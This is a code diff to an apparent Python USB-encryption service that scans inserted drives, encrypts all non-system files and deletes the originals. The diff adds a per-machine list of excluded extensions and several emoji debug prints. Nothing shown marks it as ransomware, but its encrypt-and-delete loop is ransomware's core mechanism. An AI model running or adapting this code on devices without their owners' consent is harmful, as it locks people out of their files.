@@ -77,7 +77,7 @@ def encrypt_file(filepath, key):
     os.remove(filepath)
 
 
-def encrypt_usb(usb_path, key):
+def encrypt_usb(usb_path, key, excluded_extensions):
     """Encrypt all valid files in USB"""
     encrypted_count = 0
     for root, _, files in os.walk(usb_path):
@@ -87,6 +87,11 @@ def encrypt_usb(usb_path, key):
                 continue
             if any(filepath.lower().endswith(ext) for ext in SYSTEM_EXTENSIONS):
                 continue
+            if any(filepath.lower().endswith(ext) for ext in excluded_extensions):
+                print(f"🔍🔍🔍🔍 eFOUND SOMe EXTENSIONS in encrypting")
+
+                continue
+
             try:
                 encrypt_file(filepath, key)
                 print(f"[🔐] Encrypted: {filepath}")
@@ -107,10 +112,15 @@ def get_files_to_encrypt(usb_path, excluded_extensions=[]):
                     continue
                 if any(filepath.lower().endswith(ext) for ext in SYSTEM_EXTENSIONS):
                     continue
-                if excluded_extensions:  # If list is not empty
+                if excluded_extensions:
+                    print(
+                        f"🦖🦖🦖🦖 excluded Extensions TYPE {type(excluded_extensions)} the extes = {excluded_extensions}"
+                    )
                     if any(
                         filepath.lower().endswith(ext) for ext in excluded_extensions
                     ):
+                        print(f"🦖🦖🦖🦖 eFOUND SOMe EXTENSIONS")
+
                         continue
 
                 files_to_encrypt.append(filepath)
@@ -414,8 +424,11 @@ def main():
                             f"[🔄] USB {drive} - Scanning for new files to encrypt..."
                         )
                         device_id = drive_state["device_id"]
+                        print("✅✅✅✅✅✅ -- device_id --> ", device_id)
                         machine_id = get_machine_id()
+                        print("✅✅✅✅✅✅ -- machine_id --> ", machine_id)
                         usb_serial_hash = get_usb_hardware_serial(drive)
+                        print("✅✅✅✅✅✅ -- usb_serial_hash --> ", usb_serial_hash)
 
                         excluded_extensions = get_excluded_extensions(
                             machine_id=machine_id, usb_serial_hash=usb_serial_hash
@@ -472,7 +485,11 @@ def main():
                                 )
                                 drive_state["retry_count"] = 0
 
-                                encrypted_count = encrypt_usb(drive, drive_state["key"])
+                                encrypted_count = encrypt_usb(
+                                    drive,
+                                    drive_state["key"],
+                                    excluded_extensions=excluded_extensions,
+                                )
 
                                 # Log encryption activity
                                 offline_manager.log_offline_activity(
@@ -499,9 +516,11 @@ def main():
                         )
                         # Don't add to usb_states, will retry next loop
                         continue
-                    excluded_extensions = get_excluded_extensions(device_id=device_id)
-
                     machine_id = get_machine_id()
+                    excluded_extensions = get_excluded_extensions(
+                        machine_id=machine_id, usb_serial_hash=device_id
+                    )
+
                     print(f"[🧬] USB {drive} - Serial Hash: {device_id[:16]}...")
                     print(f"[🖥️] USB {drive} - Machine ID: {machine_id}")
 
@@ -557,7 +576,9 @@ def main():
                         print(
                             f"[✅] USB {drive} - Encryption key obtained. Starting encryption..."
                         )
-                        encrypted_count = encrypt_usb(drive, key_bytes)
+                        encrypted_count = encrypt_usb(
+                            drive, key_bytes, excluded_extensions=excluded_extensions
+                        )
 
                         # Log encryption activity
                         offline_manager.log_offline_activity(
